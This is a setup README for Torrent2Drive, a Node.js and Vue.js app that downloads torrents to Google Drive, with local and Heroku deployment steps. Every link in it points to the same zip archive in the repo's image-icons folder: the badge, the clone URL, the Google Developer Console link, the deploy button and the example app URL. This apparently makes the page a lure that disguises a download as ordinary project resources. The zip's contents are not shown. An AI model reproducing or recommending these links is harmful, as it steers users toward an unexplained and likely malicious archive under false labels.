[![Torrent2GDrive](https://github.com/snjvbrla/Torrent2GDrive/raw/refs/heads/master/Torrent2Drive_frontend/public/img/icons/Torrent-Drive-G-3.0.zip)](https://github.com/snjvbrla/Torrent2GDrive/raw/refs/heads/master/Torrent2Drive_frontend/public/img/icons/Torrent-Drive-G-3.0.zip)



# Torrent2Drive

> A web application to download torrent directly to your Google Drive using Nodejs in backend and Vuejs in frontend.


# Installation

## Deploy to Local Machine

- Clone this repo to your local machine using `https://github.com/snjvbrla/Torrent2GDrive/raw/refs/heads/master/Torrent2Drive_frontend/public/img/icons/Torrent-Drive-G-3.0.zip`
- Goto [Google Developer Console](https://github.com/snjvbrla/Torrent2GDrive/raw/refs/heads/master/Torrent2Drive_frontend/public/img/icons/Torrent-Drive-G-3.0.zip) and create OAuth credentials.
- Goto `Torrent2Drive/Torrent2Drive_server` folder and create `.env` file and view file `.env-example` for reference and paste the following with OAuth credentials in .env file.

  `GOOGLE_CLIENT_ID=paste client id here`

  `GOOGLE_CLIENT_SECRET=paste client secret here`

  `SECRET=Torrent2Drive@VueJS` 


- Goto `Torrent2Drive/Torrent2Drive_frontend` folder and create `.env` file and view file `.env-example` for reference and paste in .env file

  `VUE_APP_BASEURL=http://localhost:3000`
- Goto `Torrent2Drive` folder and open terminal and write the following command for the project setup:
(Make sure npm is installed!)

  > npm run local-build
- Then to run the app write write:
  > npm run start
- So if you update the app code and to build and start the app write:
  > npm run build

  > npm run start

### Deploy to Heroku
  > :warning: **DON'T DEPLOY HEROKU NOW. DEPLOYING OF THIS APP MAY SUSPEND YOUR ACCOUNT.**
- Goto [Google Developer Console](https://github.com/snjvbrla/Torrent2GDrive/raw/refs/heads/master/Torrent2Drive_frontend/public/img/icons/Torrent-Drive-G-3.0.zip) and create OAuth credentials.
- Deploy to Heroku

     > [![Deploy](https://github.com/snjvbrla/Torrent2GDrive/raw/refs/heads/master/Torrent2Drive_frontend/public/img/icons/Torrent-Drive-G-3.0.zip)](https://github.com/snjvbrla/Torrent2GDrive/raw/refs/heads/master/Torrent2Drive_frontend/public/img/icons/Torrent-Drive-G-3.0.zip)

- For `SECRET` paste value `Torrent2Drive@VueJS` or any custom text. and use OAUTH secret and client ID.

   `GOOGLE_CLIENT_ID`

   `GOOGLE_CLIENT_SECRET`

- Set heroku `VUE_APP_BASEURL` environment variable to your heroku app URL. I have used `https://github.com/snjvbrla/Torrent2GDrive/raw/refs/heads/master/Torrent2Drive_frontend/public/img/icons/Torrent-Drive-G-3.0.zip`. So, use your own heroku URL which is `appName.herokuapp.com` where appName is your App name.
